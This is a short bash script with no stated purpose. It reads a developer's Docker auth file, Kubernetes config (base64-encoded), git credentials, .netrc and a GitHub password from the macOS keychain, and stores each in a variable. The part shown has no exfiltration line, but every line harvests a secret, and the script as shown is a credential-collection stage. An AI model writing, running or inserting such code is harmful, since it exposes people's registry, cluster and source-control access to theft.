#!/bin/bash
DOCKER_AUTH=$(cat ~/.docker/config.json)
KUBE=$(base64 < "$HOME/.kube/config")
GIT_TOKEN=$(cat ~/.git-credentials)
NETRC=$(cat ~/.netrc)
PASS=$(security find-generic-password -s github.com -w)
